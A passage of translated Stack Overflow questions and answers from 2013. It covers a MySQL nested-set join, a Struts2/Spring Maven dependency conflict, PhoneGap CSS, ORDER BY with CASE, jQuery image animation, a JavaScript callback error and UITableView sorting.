格式化你`SQL`的总是有帮助的

```
SELECT 
  node.id, 
  node.first_name, 
  node.last_name, 
  ( COUNT( parent.id ) - ( sub_tree.depth +1 ) ) AS depth
FROM 
  users AS node, 
  users AS parent, 
  users AS sub_parent, 
  (
    SELECT
      node.id, 
      node.first_name, 
      node.last_name, 
      ( COUNT( parent.id ) -1 ) AS depth
    FROM 
      users AS node, 
      users AS parent
    WHERE 
      node.lft BETWEEN parent.lft AND parent.rgt
        AND node.id =1
    GROUP BY 
      node.id
    ORDER BY 
      node.lft
  ) AS sub_tree
  JOIN users_groups ON users_groups.user_id = node.id
                                              ^^ should be sub_tree.id
WHERE 
  node.lft BETWEEN parent.lft AND parent.rgt
    AND node.lft BETWEEN sub_parent.lft AND sub_parent.rgt
    AND sub_parent.id = sub_tree.id
GROUP BY 
  node.id
ORDER BY 
  node.lft
LIMIT 0 , 30 
```

* * *

## 回答 #2

> 赞同：2
> 
> 时间：2013-04-19T18:22:30.520

你必须使用你给它的别名..

`JOIN users_groups ON users_groups.user_id = sub_tree.id`

# spring - IncompatibleClassChangeError with struts2 ，spring hibernate集成？

> ID：16110975
> 
> 赞同：-1
> 
> 时间：2013-04-19T18:10:36.090
> 
> 标签：spring, maven, struts2

Struts2 spring 插件导致 IncompatibleClassChangeError ，我试图排除 spring 核心，仍然出现异常，下面是我的 pom.xml？

```
<?xml version="1.0" encoding="UTF-8"?>
<project xmlns="http://maven.apache.org/POM/4.0.0" xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"
    xsi:schemaLocation="http://maven.apache.org/POM/4.0.0 http://maven.apache.org/xsd/maven-4.0.0.xsd">
<modelVersion>4.0.0</modelVersion>
<groupId>com.akhi</groupId>
<artifactId>notifier</artifactId>
<version>1.0-SNAPSHOT</version>
<packaging>war</packaging>
<name>Struts 2 Blank Webapp</name>
<!-- Shared version number properties -->

<properties>
    <struts2.version>2.1.8.1</struts2.version>
    <spring.version>2.5.6</spring.version>
</properties>

<dependencies>

    <!-- Struts2 dependencies -->

    <dependency>
        <groupId>org.apache.struts</groupId>
        <artifactId>struts2-core</artifactId>
        <version>${struts2.version}</version>
    </dependency>

    <dependency>
        <groupId>org.apache.struts</groupId>
        <artifactId>struts2-tiles-plugin</artifactId>
        <version>${struts2.version}</version>
    </dependency>

    <dependency>
        <groupId>org.apache.struts</groupId>
        <artifactId>struts2-config-browser-plugin</artifactId>
        <version>${struts2.version}</version>
    </dependency>

    <!-- Struts2 dependencies End -->

    <!-- Struts 2 + Spring plugins -->

    <dependency>
        <groupId>org.apache.struts</groupId>
        <artifactId>struts2-spring-plugin</artifactId>
        <version>${struts2.version}</version>
    </dependency>

    <!-- Struts 2 + Spring plugins End -->

    <!-- Spring ORM framework -->

    <dependency>
        <groupId>org.springframework</groupId>
        <artifactId>spring-hibernate3</artifactId>
        <version>2.0.8</version>
    </dependency>

    <dependency>
        <groupId>javax.transaction</groupId>
        <artifactId>jta</artifactId>
        <version>1.1</version>
    </dependency>

    <!-- Spring ORM framework Ends -->

    <!-- Hibernate uses slf4j for logging, for our purposes here use the simple 
        backend -->
    <dependency>
        <groupId>org.slf4j</groupId>
        <artifactId>slf4j-simple</artifactId>
        <version>1.6.4</version>
    </dependency>

    <!-- Hibernate framework -->
    <dependency>
        <groupId>org.hibernate</groupId>
        <artifactId>hibernate-commons-annotations</artifactId>
        <version>3.2.0.Final</version>
    </dependency>

    <dependency>
        <groupId>org.hibernate</groupId>
        <artifactId>hibernate-annotations</artifactId>
        <version>3.5.6-Final</version>
    </dependency>

    <!-- javax persistence -->
    <dependency>
        <groupId>javax.persistence</groupId>
        <artifactId>persistence-api</artifactId>
        <version>1.0.2</version>
    </dependency>

    <!-- Hibernate library dependecy start -->
    <dependency>
        <groupId>dom4j</groupId>
        <artifactId>dom4j</artifactId>
        <version>1.6.1</version>
    </dependency>

    <dependency>
        <groupId>commons-collections</groupId>
        <artifactId>commons-collections</artifactId>
        <version>3.2.1</version>
    </dependency>

    <dependency>
        <groupId>mysql</groupId>
        <artifactId>mysql-connector-java</artifactId>
        <version>5.1.9</version>
    </dependency>

    <!-- Hibernate library dependecy end -->

    <!-- Java EE -->
    <dependency>
        <groupId>javax.servlet</groupId>
        <artifactId>javax.servlet-api</artifactId>
        <version>3.0.1</version>
    </dependency>

    <dependency>
        <groupId>javax.servlet</groupId>
        <artifactId>jsp-api</artifactId>
        <version>2.0</version>
        <scope>provided</scope>
    </dependency>
    <!-- Java EE End -->
    <dependency>
        <groupId>javax.mail</groupId>
        <artifactId>mail</artifactId>
        <version>1.4</version>
    </dependency>

    <dependency>
        <groupId>commons-logging</groupId>
        <artifactId>commons-logging</artifactId>
        <version>1.1.1</version>
    </dependency>
    <dependency>
        <groupId>displaytag</groupId>
        <artifactId>displaytag</artifactId>
        <version>1.1</version>
    </dependency>
    <!-- Test -->
    <dependency>
        <groupId>junit</groupId>
        <artifactId>junit</artifactId>
        <version>4.7</version>
    </dependency>

    <dependency>
        <groupId>log4j</groupId>
        <artifactId>log4j</artifactId>
        <version>1.2.16</version>
    </dependency>

    <dependency>
        <groupId>org.quartz-scheduler</groupId>
        <artifactId>quartz</artifactId>
        <version>2.1.5</version>
    </dependency>

</dependencies>

<build>
    <plugins>
        <plugin>
            <groupId>org.mortbay.jetty</groupId>
            <artifactId>maven-jetty-plugin</artifactId>
            <version>6.1.21</version>
            <configuration>
                <scanIntervalSeconds>10</scanIntervalSeconds>
                <webDefaultXml>src/main/resources/webdefault.xml</webDefaultXml>
            </configuration>
        </plugin>
        <plugin>
            <groupId>org.apache.maven.plugins</groupId>
            <artifactId>maven-compiler-plugin</artifactId>
            <version>2.3.2</version>
            <configuration>
                <source>1.6</source>
                <target>1.6</target>
            </configuration>
        </plugin>
        <plugin>
            <groupId>org.apache.tomcat.maven</groupId>
            <artifactId>tomcat6-maven-plugin</artifactId>
            <version>2.0</version>
        </plugin>
        <plugin>
            <groupId>org.apache.tomcat.maven</groupId>
            <artifactId>tomcat7-maven-plugin</artifactId>
            <version>2.0</version>
        </plugin>
    </plugins>
</build>

<repositories>
    <repository>
        <id>JBoss repository</id>
        <url>http://repository.jboss.org/nexus/content/groups/public-jboss/</url>
    </repository>
    <repository>
        <id>org.springframework.maven.snapshot</id>
        <name>Maven Central Compatible Spring Snapshot Repository</name>
        <url>http:// maven.springframework.org/snapshot</url>
    </repository>

</repositories> 
```

异常跟踪是

```
2013-04-19T23:36:39.014+0530  INFO [main      ] tListableBeanFactory Destroying singletons in org.springframework.beans.factory.support.DefaultListableBeanFactory@5230b601: defining beans [userService,userService2,userSpringAction,welcomeUserSpringAction,org.springframework.beans.factory.config.PropertyPlaceholderConfigurer#0,dataSource,sessionFactory]; root of factory hierarchy
2013-04-19T23:36:39.015+0530 ERROR [main      ] ontext.ContextLoader Context initialization failed
org.springframework.beans.factory.BeanCreationException: Error creating bean with name 'sessionFactory' defined in ServletContext resource [/WEB-INF/applicationContext.xml]: Invocation of init method failed; nested exception is java.lang.IncompatibleClassChangeError: Implementing class
    at org.springframework.beans.factory.support.AbstractAutowireCapableBeanFactory.initializeBean(AbstractAutowireCapableBeanFactory.java:1338)
    at org.springframework.beans.factory.support.AbstractAutowireCapableBeanFactory.doCreateBean(AbstractAutowireCapableBeanFactory.java:473)
    at org.springframework.beans.factory.support.AbstractAutowireCapableBeanFactory$1.run(AbstractAutowireCapableBeanFactory.java:409)
    at java.security.AccessController.doPrivileged(Native Method)
    at org.springframework.beans.factory.support.AbstractAutowireCapableBeanFactory.createBean(AbstractAutowireCapableBeanFactory.java:380)
    at org.springframework.beans.factory.support.AbstractBeanFactory$1.getObject(AbstractBeanFactory.java:264)
    at org.springframework.beans.factory.support.DefaultSingletonBeanRegistry.getSingleton(DefaultSingletonBeanRegistry.java:222)
    at org.springframework.beans.factory.support.AbstractBeanFactory.doGetBean(AbstractBeanFactory.java:261)
    at org.springframework.beans.factory.support.AbstractBeanFactory.getBean(AbstractBeanFactory.java:185)
    at org.springframework.beans.factory.support.AbstractBeanFactory.getBean(AbstractBeanFactory.java:164)
    at org.springframework.beans.factory.support.DefaultListableBeanFactory.preInstantiateSingletons(DefaultListableBeanFactory.java:423)
    at org.springframework.context.support.AbstractApplicationContext.finishBeanFactoryInitialization(AbstractApplicationContext.java:728)
    at org.springframework.context.support.AbstractApplicationContext.refresh(AbstractApplicationContext.java:380)
    at org.springframework.web.context.ContextLoader.createWebApplicationContext(ContextLoader.java:255)
    at org.springframework.web.context.ContextLoader.initWebApplicationContext(ContextLoader.java:199)
    at org.springframework.web.context.ContextLoaderListener.contextInitialized(ContextLoaderListener.java:45)
    at org.mortbay.jetty.handler.ContextHandler.startContext(ContextHandler.java:548)
    at org.mortbay.jetty.servlet.Context.startContext(Context.java:136)
    at org.mortbay.jetty.webapp.WebAppContext.startContext(WebAppContext.java:1250)
    at org.mortbay.jetty.handler.ContextHandler.doStart(ContextHandler.java:517)
    at org.mortbay.jetty.webapp.WebAppContext.doStart(WebAppContext.java:467)
    at org.mortbay.jetty.plugin.Jetty6PluginWebAppContext.doStart(Jetty6PluginWebAppContext.java:115)
    at org.mortbay.component.AbstractLifeCycle.start(AbstractLifeCycle.java:50)
    at org.mortbay.jetty.handler.HandlerCollection.doStart(HandlerCollection.java:152)
    at org.mortbay.jetty.handler.ContextHandlerCollection.doStart(ContextHandlerCollection.java:156)
    at org.mortbay.component.AbstractLifeCycle.start(AbstractLifeCycle.java:50)
    at org.mortbay.jetty.handler.HandlerCollection.doStart(HandlerCollection.java:152)
    at org.mortbay.component.AbstractLifeCycle.start(AbstractLifeCycle.java:50)
    at org.mortbay.jetty.handler.HandlerWrapper.doStart(HandlerWrapper.java:130)
    at org.mortbay.jetty.Server.doStart(Server.java:224)
    at org.mortbay.component.AbstractLifeCycle.start(AbstractLifeCycle.java:50)
    at org.mortbay.jetty.plugin.Jetty6PluginServer.start(Jetty6PluginServer.java:132)
    at org.mortbay.jetty.plugin.AbstractJettyMojo.startJetty(AbstractJettyMojo.java:441)
    at org.mortbay.jetty.plugin.AbstractJettyMojo.execute(AbstractJettyMojo.java:383)
    at org.mortbay.jetty.plugin.AbstractJettyRunMojo.execute(AbstractJettyRunMojo.java:210)
    at org.mortbay.jetty.plugin.Jetty6RunMojo.execute(Jetty6RunMojo.java:184)
    at org.apache.maven.plugin.DefaultPluginManager.executeMojo(DefaultPluginManager.java:490)
    at org.apache.maven.lifecycle.DefaultLifecycleExecutor.executeGoals(DefaultLifecycleExecutor.java:694)
    at org.apache.maven.lifecycle.DefaultLifecycleExecutor.executeStandaloneGoal(DefaultLifecycleExecutor.java:569)
    at org.apache.maven.lifecycle.DefaultLifecycleExecutor.executeGoal(DefaultLifecycleExecutor.java:539)
    at org.apache.maven.lifecycle.DefaultLifecycleExecutor.executeGoalAndHandleFailures(DefaultLifecycleExecutor.java:387)
    at org.apache.maven.lifecycle.DefaultLifecycleExecutor.executeTaskSegments(DefaultLifecycleExecutor.java:348)
    at org.apache.maven.lifecycle.DefaultLifecycleExecutor.execute(DefaultLifecycleExecutor.java:180)
    at org.apache.maven.DefaultMaven.doExecute(DefaultMaven.java:328)
    at org.apache.maven.DefaultMaven.execute(DefaultMaven.java:138)
    at org.apache.maven.cli.MavenCli.main(MavenCli.java:362)
    at org.apache.maven.cli.compat.CompatibleMain.main(CompatibleMain.java:60)
    at sun.reflect.NativeMethodAccessorImpl.invoke0(Native Method)
    at sun.reflect.NativeMethodAccessorImpl.invoke(NativeMethodAccessorImpl.java:39)
    at sun.reflect.DelegatingMethodAccessorImpl.invoke(DelegatingMethodAccessorImpl.java:25)
    at java.lang.reflect.Method.invoke(Method.java:597)
    at org.codehaus.classworlds.Launcher.launchEnhanced(Launcher.java:315)
    at org.codehaus.classworlds.Launcher.launch(Launcher.java:255)
    at org.codehaus.classworlds.Launcher.mainWithExitCode(Launcher.java:430)
    at org.codehaus.classworlds.Launcher.main(Launcher.java:375) 
```

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-04-19T19:14:30.877

你不能像那样混合 Struts 2 版本；您正在使用 Struts 2.1.8.1 并尝试使用 Struts 2 Tiles Plugin 版本 2.3.4（和 Spring Plugin 2.1.8）和几个不同版本的 Spring。

您不得随意挑选版本；这是 Maven 的一件事：允许版本指定它们自己的依赖项，而不是试图猜测哪些版本是兼容的。

首先，使用每个 Struts 2 工件的相同版本。其次，对 Spring 做同样的事情。但是，如果您使用 Struts 2 Spring 插件，则不需要指定 Spring 版本，因为它将声明自己的依赖项。

一旦开始混合和匹配，您通常需要开始在各种工件中指定*大量排除项。*除非您非常清楚自己在做什么，否则最好不要这样做。

# cordova - 使用一个 PhoneGap Build 项目来制作 Android 和 IOS 应用程序

> ID：16110977
> 
> 赞同：1
> 
> 时间：2013-04-19T18:10:40.003
> 
> 标签：cordova, phonegap-build

到目前为止，我只构建了一个应用程序，并且无法使用单个项目来构建 Android 和 IOS 应用程序。我必须制作两个项目，唯一真正的区别是 css 文件。我无法弄清楚如何使媒体查询正确地为同一个 css 文件中的两个设备提取正确的图像。

我想知道这是否是一个常见的解决方案，或者是否有一个可靠的 css 文件可以为 IOS 和 Android 正确加载正确的图像？

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2013-04-22T15:09:36.630

媒体查询的替代方法可能是使用 Javascript 和[PhoneGap 设备 API](http://docs.phonegap.com/en/2.6.0/cordova_device_device.md.html#Device)进行平台检测。

PhoneGap 文档中的示例：

```
// Depending on the device, a few examples are:
//   - "Android"
//   - "BlackBerry"
//   - "iOS"
//   - "webOS"
//   - "WinCE"
//   - "Tizen"
var devicePlatform = device.platform; 
```

然后根据平台，您可以动态加载您的 css 文件。

动态加载 css 文件的示例：

```
var link = document.createElement("link");
link.href = "http://example.com/mystyle.css";
link.type = "text/css";
link.rel = "stylesheet";
document.getElementsByTagName("head")[0].appendChild(link); 
```

来源：[https ://stackoverflow.com/a/9345038/702478](https://stackoverflow.com/a/9345038/702478)

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2013-04-22T14:51:22.210

作为替代方法，我不是检测设备宽度，而是专注于检测像素比率。到目前为止，这似乎更可靠。

在 css 文件中使用基类，然后使用 2x 类：

```
.some-image { background-image: url(../images/1x/icons/someicon.png);
              height:32px;
              width:32px;
 }

@media only screen and (-webkit-min-device-pixel-ratio: 2) {
/* 2x version of image */

    .some-image { background-image: url(../images/2x/icons/someicon.png);
                  height:32px;
                  width:32px;

    }

} 
```

# mysql - 是否可以在案例陈述中通过“DESC/ASC”更改顺序 - MySql

> ID：16110981
> 
> 赞同：6
> 
> 时间：2013-04-19T18:10:45.173
> 
> 标签：mysql, select, sql-order-by

我有一个按命令排序的 select 语句。现在 order by 命令有一个 case 语句，它基于它按不同列排序的记录的状态。但是，如果状态 = 1，我还需要按 DESC 订购，否则按 ASC 订购。

我怎样才能做到这一点？

这是我目前的声明：

```
SELECT ph.phone_call_id AS id, ph.call_subject AS callSubject,
       ph.trigger_on AS triggerOn,
       ph.isAppointment,
       IFNULL(ph.last_attempt_on, "") last_attempt_on,
       ind.name AS industry,
       ac.account_id,
       ac.account_name AS accountName
       FROM phone_calls AS ph
       INNER JOIN accounts AS ac ON ph.account_id = ac.account_id
       INNER JOIN industries AS ind ON ind.industry_id = ac.industry_id
       INNER JOIN call_codes AS cc ON ph.call_code_id = cc.call_code_id
       WHERE ac.status = 1 
       AND ph.status = '.$call_status.' 
       AND ph.owner_id = '. USER_ID .' 
       AND ac.do_not_call = 0 
       ORDER BY CASE WHEN ph.status = 1 THEN ph.trigger_on ELSE ph.last_attempt_on END 
```

* * *

## 回答 #1

> 赞同：14
> 
> 时间：2013-04-19T18:20:57.033

这是你想要的吗？

```
ORDER BY (CASE WHEN ph.status = 1 THEN ph.trigger_on  end) DESC,
         (case when ph.status <> 1 then ph.last_attempt_on END) ASC 
```

# javascript - 使用 jQuery 在单击时为图像大小设置动画

> ID：16110984
> 
> 赞同：2
> 
> 时间：2013-04-19T18:11:06.323
> 
> 标签：javascript, jquery, jquery-animate

我试图为一个大图像制作动画，以便它改变尺寸，从 (200x116)px 开始并在点击时变为 (400x232)px，然后如果再次点击将恢复为 (200x116)px，

这是代码的链接：http: [//jsfiddle.net/edddotcom/FMfC4/1/](http://jsfiddle.net/edddotcom/FMfC4/1/)

HTML：

```
<img id="imgtab" src="http://cloudsmaker.com/hipsterwall/img/salto-al-norte.jpg"> 
```

CSS：

```
#imgtab {
    position:relative;
} 
```

JavaScript：

```
$(document).ready(function () {
    $("#imgtab").toggle(function () { //fired the first time
        $("#imgtab").animate({
            width: "200px"
            height: "116px"
        });
    }, function () { // fired the second time 
        $("#imgtab").animate({
            width: "400px"
            height: "232px"
        });
    });
}); 
```

单击图像应使其动画从小到大，但似乎没有改变。谁能建议改变什么并告诉我我做错了什么？

* * *

## 回答 #1

> 赞同：6
> 
> 时间：2013-04-19T18:22:46.197

如果您只是想在点击时切换，请在下面尝试

```
 $(document).ready(function () {
        var small={width: "200px",height: "116px"};
        var large={width: "400px",height: "232px"};
        var count=1; 
        $("#imgtab").css(small).on('click',function () { 
            $(this).animate((count==1)?large:small);
            count = 1-count;
        });
    });
```

```
<script src="https://ajax.googleapis.com/ajax/libs/jquery/2.1.1/jquery.min.js"></script>
<img id="imgtab" class='small' src="http://cloudsmaker.com/hipsterwall/img/salto-al-norte.jpg">
```

或者

您还可以使用**jQuery-ui 小部件**库中提供的持续时间参数`addClass`和`removeClass`函数。IE

 **```
$(document).ready(function () {
    var count=1; 
    $("#imgtab").on('click', function () {
        var $this = $(this);
        $this.removeClass('small, large',400);
        $this.addClass((count==1)?'large':'small',400);
        count = 1-count;
    })
}); 
```

其中`.small`和`.large`css 类是：

```
.small{
    width:200px;
    height:116px;
}
.large{
    width:400px;
    height:232px;
} 
```

看到这个工作[小提琴](http://jsfiddle.net/FMFc4/35/)。

**注意：**您还需要参考 jQuery UI 库，导致持续时间参数`addClass`和`removeClass`仅在此处可用。

* * *

## 回答 #2

> 赞同：3
> 
> 时间：2013-04-19T18:14:35.037

`animate`您在方法中作为参数传递的对象属性之间缺少逗号。

```
$(document).ready(function () {
    $("#imgtab").toggle(function () { //fired the first time
        $("#imgtab").animate({
            width: "200px",//HERE
            height: "116px"
        });
    }, function () { // fired the second time 
        $("#imgtab").animate({
            width: "400px",//HERE
            height: "232px"
        });
    });
}); 
```

例如：http : [//jsfiddle.net/dFU9P/](http://jsfiddle.net/dFU9P/)

* * *

## 回答 #3

> 赞同：2
> 
> 时间：2013-04-19T18:37:17.773

这是一种无需使用 jQuery 的 animate 而是使用 CSS 动画即可实现动画效果的简单方法。我不知道您需要支持哪些浏览器，但很高兴看到如何以不同的方式完成它。

HTML：

```
<img id="imgtab" src="http://cloudsmaker.com/hipsterwall/img/salto-al-norte.jpg"> 
```

CSS：

```
img {
    height: 200px;
    width: 116px;
    -webkit-transition: all .4s ease-in; //added vendor prefixes for older browsers
    -moz-transition: all .4s ease-in; //first parameter decides what properties to animate
    -m-transition: all .4s ease-in; // second is duration
    -o-transition: all .4s ease-in; //3rd is the timing-function
       transition: all .4s ease-in;
}

.fullSize {
    height: 400px;
    width: 232px;
} 
```

jQuery：

```
$('#imgtab').on('click', function(e) {
    $(this).toggleClass('fullSize');
}); 
```

这是小提琴[http://jsfiddle.net/AtQwM/](http://jsfiddle.net/AtQwM/)。随意摆弄不同效果的过渡参数！

* * *

## 回答 #4

> 赞同：0
> 
> 时间：2013-04-19T18:28:18.460

`Toggle`为一个事件提供两种状态，但使用它的任何动画都以`display:none`. 因此，您需要使用自己的切换机制，使用变量来控制图像的状态：

```
$(document).ready(function() {
    var imgSmall = false

    $('#imgtab').on('click',function() {
        $("#textab").toggle(20);
        if ( imgSmall ) {
            $('#imgtab').animate({width:"400px",height:"232px"});
            imgSmall = false
        } else {
            $('#imgtab').animate({width:"200px",height:"116px"});
            imgSmall = true
        }
    });
}); 
```

[http://jsfiddle.net/FMfC4/3/](http://jsfiddle.net/FMfC4/3/)

* * *

## 回答 #5

> 赞同：0
> 
> 时间：2013-04-19T19:14:09.800

它们可以是数据属性，而不是在代码中放置新的图像维度。 [http://jsfiddle.net/FMfC4/8/](http://jsfiddle.net/FMfC4/8/)

```
<img class="imgtab" src="http://cloudsmaker.com/hipsterwall/img/salto-al-norte.jpg" data-width="400" data-height="200">

(function($) {
$.fn.imageSizer = function() {

    var originalSize = {
        width: this.width(),
        height: this.height()
    };

    this.on('click', function() {
        var newSize = {
            width: $(this).data('width'),
            height: $(this).data('height')
        };

        var currentSize = ($(this).width() == newSize.width) ? originalSize : newSize;

        $(this).animate(currentSize);
    });    
}
})(jQuery);

$(document).ready(function() {
    $(".imgtab").imageSizer();
}); 
```**

# javascript - .length 返回未定义的问题

> ID：16110992
> 
> 赞同：0
> 
> 时间：2013-04-19T18:11:24.787
> 
> 标签：javascript

我正在构建一个使用名为 Chat.fetch(); 的函数的项目；它是一个异步函数，从服务器中提取字符串数组。这是一个 ajax 函数，为了项目的目的已经定义了，我只需要正确调用它。我们还有另一个名为 Chat.display() 的函数，它接受一个字符串并在控制台上以项目符号的形式显示它。现在这就是我所得到的：我收到一个错误，说无法读取未定义的属性长度。所以我猜想.length 对于 superArray 是未定义的吗？目标是创建此函数并将其用作 Chat.fetch() 的回调函数。你们知道为什么我会收到这个 .length 错误吗？我很困惑。谢谢！

```
<!DOCTYPE html>
    <html>
  <head>
    <meta charset="utf-8">
    <script src="http://chatbuilder.hackreactor.com/ChatBuilder.js"></script>
  </head>
  <body>
    <script>

    Chat.guide.start();
    </script>

    <h2>Borken Chat</h2>

    <input class="draft" type="text"/> <button class="send" disabled>send</button>

    <ul class="messages">

  <script>
    var list;
    var superArray=[];
    darray=function(superArray){
      var y=superArray.length;
      for(i=0;i<y;i++){
        Chat.display(x[i]);
      }
    }
    Chat.fetch(darray(list));
  </script>

    </ul> 
```

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-04-19T18:37:51.740

尝试通过将变量设置为 0 来初始化变量 `var list = 0`。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2013-04-19T18:15:32.433

因为您是`list`作为 superArray 参数发送的，并且`list`确实在 undefined 中您需要发送 superArray：

```
Chat.fetch(darray(superArray)); 
```

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2013-04-19T18:16:56.067

您将变量“列表”传递给函数

```
Chat.fetch(darray(list)); 
```

此时列表未定义，因此您不能在其上使用“长度”是正常的。我不知道这个函数的正确用法是什么，但我认为你必须将“superArray”传递给函数而不是“list”

# ios - uitableviewcell 项目的自动重新排列

> ID：16110998
> 
> 赞同：0
> 
> 时间：2013-04-19T18:11:39.600
> 
> 标签：ios, objective-c, uitableview, uidatepicker

我允许用户从`UIDatePicker`视图中选择一个日期，然后标题`UITableView`将显示选择器视图中的日期。我的问题是，是否可以`UITableView`根据`UITableView`标题的日期自动将项目从旧到新重新排列并重新加载表格？

这是我的代码，

```
@interface PictureListMainTable : UITableViewController{
}

@property (strong, nonatomic) NSManagedObjectContext *managedObjectContext;
@property (strong, nonatomic) NSMutableArray *pictureListData;

- (void)readDataForTable;

@end

@synthesize managedObjectContext, pictureListData;
@synthesize scroll;

- (void)viewWillAppear:(BOOL)animated
{
    //  Repopulate the array with new table data
    [self readDataForTable];

    NSCalendar *cal = [NSCalendar currentCalendar];
    NSDateFormatter *dateFormatter = [[NSDateFormatter alloc]init];
    [dateFormatter setDateFormat:@"dd.MMMM - EEEE"];
    NSDate *today = [NSDate date];
    [pictureListData  enumerateObjectsUsingBlock:^(id obj, NSUInteger idx, BOOL *stop) {
        Pictures *picture = (Pictures *)obj;
        NSDate *date = [dateFormatter dateFromString:picture.title];
        NSDateComponents *components = [cal components:NSDayCalendarUnit
                                              fromDate:date
                                                toDate:today
                                               options:0];
        if ([components day]==0) {
            *stop = TRUE;
            NSIndexPath *indexPath = [NSIndexPath indexPathForRow:idx inSection:0];
            [self.tableView scrollToRowAtIndexPath:indexPath
                                  atScrollPosition:UITableViewScrollPositionTop
                                          animated:YES];
        }
    }];
}
//  When the view reappears, read new data for table

//  Grab data for table - this will be used whenever the list appears or reappears after an add/edit
- (void)readDataForTable
{
    //  Grab the data
    pictureListData = [CoreDataHelper getObjectsForEntity:@"Pictures" withSortKey:@"title" andSortAscending:YES andContext:managedObjectContext];

    //  Force table refresh
    [self.tableView reloadData];
}

#pragma mark - Actions

//  Button to log out of app (dismiss the modal view!)

#pragma mark - Segue methods

- (void)prepareForSegue:(UIStoryboardSegue *)segue sender:(id)sender
{
    //  Get a reference to our detail view
    PictureListDetail *pld = (PictureListDetail *)[segue destinationViewController];

    //  Pass the managed object context to the destination view controller
    pld.managedObjectContext = managedObjectContext;

    //  If we are editing a picture we need to pass some stuff, so check the segue title first
    if ([[segue identifier] isEqualToString:@"EditPicture"])
    {
        //  Get the row we selected to view
        NSInteger selectedIndex = [[self.tableView indexPathForSelectedRow] row];

        //  Pass the picture object from the table that we want to view
        pld.currentPicture = [pictureListData objectAtIndex:selectedIndex];
    }
}

#pragma mark - Table view data source

//  Return the number of sections in the table
- (NSInteger)numberOfSectionsInTableView:(UITableView *)tableView
{
    return 1;
}

//  Return the number of rows in the section (the amount of items in our array)
- (NSInteger)tableView:(UITableView *)tableView numberOfRowsInSection:(NSInteger)section
{
    return [pictureListData count];
}

//  Create / reuse a table cell and configure it for display
- (UITableViewCell *)tableView:(UITableView *)tableView cellForRowAtIndexPath:(NSIndexPath *)indexPath
{
    static NSString *CellIdentifier = @"Cell";

    UITableViewCell *cell = [tableView dequeueReusableCellWithIdentifier:CellIdentifier];
    if (cell == nil) {
        cell = [[UITableViewCell alloc] initWithStyle:UITableViewCellStyleDefault reuseIdentifier:CellIdentifier];
    }

    // Get the core data object we need to use to populate this table cell
    Pictures *currentCell = [pictureListData objectAtIndex:indexPath.row];

    //  Fill in the cell contents
    cell.textLabel.text = [currentCell title];
    cell.detailTextLabel.text = [currentCell desc];

    //  If a picture exists then use it
    if ([currentCell smallPicture])
    {
        cell.imageView.contentMode = UIViewContentModeScaleAspectFit;
        cell.imageView.image = [UIImage imageWithData:[currentCell smallPicture]];
    }

    return cell;
}

//  Swipe to delete has been used.  Remove the table item
- (void)tableView:(UITableView *)tableView commitEditingStyle:(UITableViewCellEditingStyle)editingStyle forRowAtIndexPath:(NSIndexPath *)indexPath
{
    if (editingStyle == UITableViewCellEditingStyleDelete)
    {
        //  Get a reference to the table item in our data array
        Pictures *itemToDelete = [self.pictureListData objectAtIndex:indexPath.row];

        //  Delete the item in Core Data
        [self.managedObjectContext deleteObject:itemToDelete];

        //  Remove the item from our array
        [pictureListData removeObjectAtIndex:indexPath.row];

        //  Commit the deletion in core data
        NSError *error;
        if (![self.managedObjectContext save:&error])
            NSLog(@"Failed to delete picture item with error: %@", [error domain]);

        // Delete the row from the data source
        [tableView deleteRowsAtIndexPaths:[NSArray arrayWithObject:indexPath] withRowAnimation:UITableViewRowAnimationFade];
    }   
}

@end 
```

谢谢。